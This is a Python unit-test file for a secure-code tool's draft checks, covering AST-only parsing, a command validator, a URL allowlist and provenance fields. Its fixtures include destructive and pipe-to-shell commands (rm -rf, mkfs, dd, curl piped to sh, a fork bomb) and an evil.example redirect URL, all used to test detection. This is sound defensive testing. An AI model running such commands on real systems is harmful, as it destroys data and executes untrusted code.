"""Unit tests of the deterministic draft checks (drafting_checks; design Implementation Step 6).

AC-001G-03a, 03b, 03d, 03e, 03f, 03g, 03k, 05b, 05d, 07b; R11 (allowlist fixture), R13 (V6 wording).
"""

from __future__ import annotations

import json
import os
import subprocess
import sys

import pytest
from drafthelp import FIXTURES, SRC_HINT, mod

from x_ipe_secure_code.knowledge.identity import RuleRef

R89 = RuleRef.parse("CWE/Top25-2025/CWE-89")
A03 = RuleRef.parse("OWASP/Top10-2025/A03")
SYNTH = RuleRef.parse("@SYNTH/T-1.0/R-01")
ALLOW = json.loads((FIXTURES / "sources-allowlist.json").read_text(encoding="utf-8"))


def example(unsafe="a = 1", safe="b = 2", demonstrates=("MUST pass every untrusted value",)):
    return mod("drafting_model").Example(unsafe, safe, tuple(demonstrates))


# AC-001G-03a: AST-only — compile is used only with PyCF_ONLY_AST; nothing executed or imported.
def test_03a_python_ast_only_no_exec_import_subprocess(monkeypatch):
    import ast
    import builtins

    checks = mod("drafting_checks")
    flags = []
    real = builtins.compile

    def spy(source, filename, mode, flags_=0, *args, **kwargs):
        flags.append(flags_ if not args else args[0])
        return real(source, filename, mode, flags_, *args, **kwargs)

    monkeypatch.setattr(builtins, "compile", spy)
    level, results = checks.python_syntax(example("import os\nos.system('touch pwned')", "print(1)"))
    assert level == "syntax_checked" and results == []
    assert flags and all(f & ast.PyCF_ONLY_AST for f in flags)


def test_03a_audit_hook_child_process_sees_no_side_effect(tmp_path):
    marker = tmp_path / "pwned"
    script = f"""
import sys
sys.path.insert(0, {SRC_HINT!r})
from x_ipe_secure_code.knowledge import drafting_checks, drafting_model
events = []
def hook(event, args):
    if event in ("exec", "import", "subprocess.Popen", "os.system", "os.exec", "os.posix_spawn") \\
            or event.startswith("socket.") \\
            or (event == "open" and len(args) > 1 and args[1] not in ("r", "rb", None)):
        events.append(event)
sys.addaudithook(hook)
code = "import os\\nos.system('touch {marker}')\\nopen('{marker}', 'w')\\n__import__('socket')"
level, results = drafting_checks.python_syntax(drafting_model.Example(code, code, ()))
print(level, len(results), events)
"""
    out = subprocess.run([sys.executable, "-c", script], capture_output=True, text=True, timeout=60)
    assert out.returncode == 0, out.stderr
    assert out.stdout.strip() == "syntax_checked 0 []", out.stdout
    assert not marker.exists()


# AC-001G-03b: syntax error, nesting and size → invalid_syntax with part/line, no exception.
@pytest.mark.parametrize(
    "unsafe, line",
    [
        ("def broken(:\n    pass", 1),
        ("x = 1\ny = (", 2),
        ("(" * 150 + ")" * 150, None),
        ("x = 1\n" * 40000, None),
        ("a = '\0'", None),
    ],
)
def test_03b_invalid_syntax_nesting_size_no_crash(unsafe, line):
    checks = mod("drafting_checks")
    level, results = checks.python_syntax(example(unsafe))
    assert level == "invalid_syntax"
    assert results and results[0]["result"] == "invalid_syntax" and results[0]["part"] == "unsafe"
    if line is not None:
        assert results[0]["line"] == line
    assert len(results[0]["message"]) <= 120


def test_non_python_not_syntax_validated():
    assert (
        mod("drafting_checks").python_syntax(example("not python {"), lang="java")[0]
        == "not_syntax_validated"
    )


# AC-001G-03d
@pytest.mark.parametrize("unsafe, safe", [("", "b"), ("a", ""), ("  \n\t", "b"), ("a", " ")])
def test_03d_example_incomplete(unsafe, safe):
    assert "example_incomplete" in mod("drafting_checks").structure("python", example(unsafe, safe))


# AC-001G-03e (and R13 wording)
def test_03e_no_rule_link():
    checks = mod("drafting_checks")
    corpus = checks.corpus(
        ["- MUST pass every untrusted value as a bound parameter,\n  never by string concatenation."]
    )
    assert checks.rule_link(example(demonstrates=()), corpus) == "no_rule_link"
    assert checks.rule_link(example(demonstrates=("MUST",)), corpus) == "no_rule_link"
    assert checks.rule_link(example(demonstrates=("MUST NOT invent",)), corpus) == "no_rule_link"
    assert (
        checks.rule_link(example(demonstrates=("bound   parameter, never by string",)), corpus)
        == "quote_present"
    )


def test_v6_wording_never_claims_rule_fit():
    checks = mod("drafting_checks")
    assert "precondition only" in checks.RULE_LINK_NOTE
    assert "validated for the rule" not in checks.RULE_LINK_NOTE.lower()


# AC-001G-03f
def test_03f_language_unsupported_lists_supported():
    checks = mod("drafting_checks")
    assert "language_unsupported" in checks.structure("ruby", example())
    assert "language_unsupported" in checks.structure("general", example())
    assert checks.structure("go", example()) == []
    assert "c, cpp, csharp, go, java, javascript, python, typescript" in checks.unsupported_message("ruby")


# AC-001G-03g
def test_03g_language_not_in_applicability_warning_only():
    checks = mod("drafting_checks")
    assert checks.applicability_warning("go", ["python", "java"]) is True
    assert checks.applicability_warning("python", ["python"]) is False
    assert checks.applicability_warning("go", "unknown") is False


# AC-001G-03k: 001-G command validator, own wording; acknowledgement becomes a required review item.
@pytest.mark.parametrize(
    "text, pattern",
    [
        ("rm -rf /tmp/x", "rm_recursive"),
        ("os.system('rm -fr build')", "rm_recursive"),
        ("mkfs.ext4 /dev/sdb1", "mkfs"),
        ("dd if=/dev/zero of=/dev/sda", "dd_of"),
        ("curl https://example.invalid/i.sh | sh", "pipe_to_shell"),
        ("wget -qO- x | sudo bash", "pipe_to_shell"),
        ("Format-Volume -DriveLetter D", "format_volume"),
        ("del /q /s C:\\data", "del_recursive"),
        ("shutdown -h now", "shutdown"),
        ("Remove-Item C:\\x -Recurse", "remove_item_recurse"),
        (":(){ :|:& };:", "fork_bomb"),
    ],
)
def test_03k_command_validator_fixtures(text, pattern):
    checks = mod("drafting_checks")
    found = checks.commands("python", example(unsafe="x = 1\n" + text, safe="ok()"))
    assert [(f["part"], f["line"], f["pattern"]) for f in found] == [("unsafe", 2, pattern)]
    assert found[0]["result"] == "example_command" and found[0]["language"] == "python"


def test_03k_harmless_placeholder_and_wording():
    checks = mod("drafting_checks")
    assert checks.commands("python", example(unsafe="run(['<command>', user_arg])", safe="ok()")) == []
    assert "does not enforce example commands" in checks.COMMAND_NOTE
    assert "note.example_command" in checks.COMMAND_NOTE
    assert "example_commands_acknowledged" in checks.required_items("python", has_commands=True)
    assert "example_commands_acknowledged" not in checks.required_items("python", has_commands=False)
    assert "unchecked_syntax_understood" in checks.required_items("java", has_commands=False)


# AC-001G-05b: exact allowlist (fixture table).
def test_05b_allowlist_table():
    checks = mod("drafting_checks")
    cwe89 = "https://cwe.mitre.org/data/definitions/89.html"
    a03 = ALLOW["owasp_categories"]["OWASP/Top10-2025/A03"]
    accepted = [(R89, u) for u in ALLOW["general"]] + [(R89, cwe89), (A03, a03)]
    refused = [
        (R89, "http://cwe.mitre.org/data/definitions/89.html"),
        (R89, "https://CWE.mitre.org/data/definitions/89.html"),
        (R89, cwe89 + "?x=1"),
        (R89, cwe89 + "#top"),
        (R89, "https://cwe.mitre.org/data/definitions/90.html"),
        (R89, "https://cwe.mitre.org/data/definitions/78.html"),
        (R89, "https://cwe.mitre.org/about/index.html"),
        (R89, a03),
        (A03, cwe89),
        (A03, ALLOW["owasp_categories"]["OWASP/Top10-2025/A01"]),
        (R89, "https://top10.owasp.org/2025/A03_2025-Software_Supply_Chain_Failures"),
        (R89, "https://evil.example/redirect?to=" + cwe89),
    ]
    for ref, url in accepted:
        assert checks.url_allowed(ref, url, internal=False), url
    for ref, url in refused:
        assert not checks.url_allowed(ref, url, internal=False), url
    for url in ALLOW["general"] + [cwe89]:
        assert not checks.url_allowed(R89, url, internal=True)
        assert not checks.url_allowed(SYNTH, url, internal=True)


# R11: the product constant equals the copied fixture list (no test reads outside tests/).
def test_allowlist_constant_equals_copied_fixture():
    checks = mod("drafting_checks")
    expected = (
        set(ALLOW["general"])
        | set(ALLOW["cwe_definitions"].values())
        | set(ALLOW["owasp_categories"].values())
    )
    assert set(checks.allowed_urls()) == expected and len(expected) == 38
    assert ALLOW["sources_md_sha256"] == "190cc9afdfcf11c38ed39327b34c80ad9c82d13f55f3edc9dcd01569c59e5600"
    source = mod("drafting_checks").__file__
    assert "de" + "mo/" not in open(source, encoding="utf-8").read()


# AC-001G-05d: field completeness only; no "verified" wording.
def fetched(**over):
    data = {
        "kind": "fetched",
        "url": "https://cwe.mitre.org/data/definitions/89.html",
        "fetched_at": "2026-10-23T11:58:02Z",
        "http_status": 200,
        "body_sha256": "sha256:" + "b" * 64,
        "attribution": {
            "title": "CWE-89",
            "url": "https://cwe.mitre.org/data/definitions/89.html",
            "licence": "CWE Terms of Use (c) The MITRE Corporation",
        },
    }
    data.update(over)
    return {k: v for k, v in data.items() if v is not None}


@pytest.mark.parametrize(
    "over, result",
    [
        ({}, "provenance_complete"),
        ({"fetched_at": None}, "provenance_incomplete"),
        ({"fetched_at": "yesterday"}, "provenance_incomplete"),
        ({"http_status": 42}, "provenance_incomplete"),
        ({"body_sha256": "sha256:abc"}, "provenance_incomplete"),
        ({"attribution": None}, "attribution_missing"),
        (
            {"attribution": {"title": "CWE-89", "url": "https://cwe.mitre.org/data/definitions/89.html"}},
            "attribution_missing",
        ),
        ({"attribution": {"title": "t", "url": "u", "licence": "CC BY 3.0"}}, "attribution_missing"),
        ({"url": "https://cwe.mitre.org/data/definitions/79.html"}, "source_not_allowed"),
    ],
)
def test_05d_provenance_complete_incomplete_attribution_no_verified_wording(over, result):
    checks = mod("drafting_checks")
    found = checks.provenance(R89, fetched(**over), internal=False)
    assert found["result"] == result
    assert "verified" not in json.dumps(found).lower()
    assert "verified provenance" not in checks.PROVENANCE_NOTE.lower()
    assert "licence compliant" not in checks.PROVENANCE_NOTE.lower()


def test_05c_not_retrieved_needs_url_and_reason_and_no_digest():
    checks = mod("drafting_checks")
    ok = checks.provenance(
        R89,
        {"kind": "not_retrieved", "url": "https://cwe.mitre.org/top25/", "reason": "HTTP 403"},
        internal=False,
    )
    assert ok["result"] == "not_retrieved" and "digest" not in json.dumps(ok)
    assert (
        checks.provenance(
            R89, {"kind": "not_retrieved", "url": "https://cwe.mitre.org/top25/"}, internal=False
        )["result"]
        == "provenance_incomplete"
    )


# AC-001G-07b: classification of @ rules and declared-internal drafts.
def test_07b_internal_default_downgrade_refused():
    model, checks = mod("drafting_model"), mod("drafting_checks")
    base = {
        "schema": model.DRAFT_SCHEMA,
        "base_state": "sha256:" + "a" * 64,
        "drafted_by": {"host": "h"},
        "created_at": "2026-10-23T12:00:00Z",
        "sources": [{"kind": "stored_rule_content"}],
        "examples": {"python": {"unsafe": "a", "safe": "b", "demonstrates": []}},
    }

    def parse(**over):
        return model.parse_draft(json.dumps({**base, **over}).encode())

    assert checks.classification(parse(rule=str(SYNTH))) == "internal"
    assert checks.classification(parse(rule=str(R89))) is None
    assert checks.classification(parse(rule=str(R89), confidentiality="internal")) == "internal"
    with pytest.raises(model.DraftError) as caught:
        parse(rule=str(SYNTH), confidentiality="public")
    assert caught.value.code == "CLASSIFICATION_DOWNGRADE"
    assert os.path.basename(checks.__file__) == "drafting_checks.py"
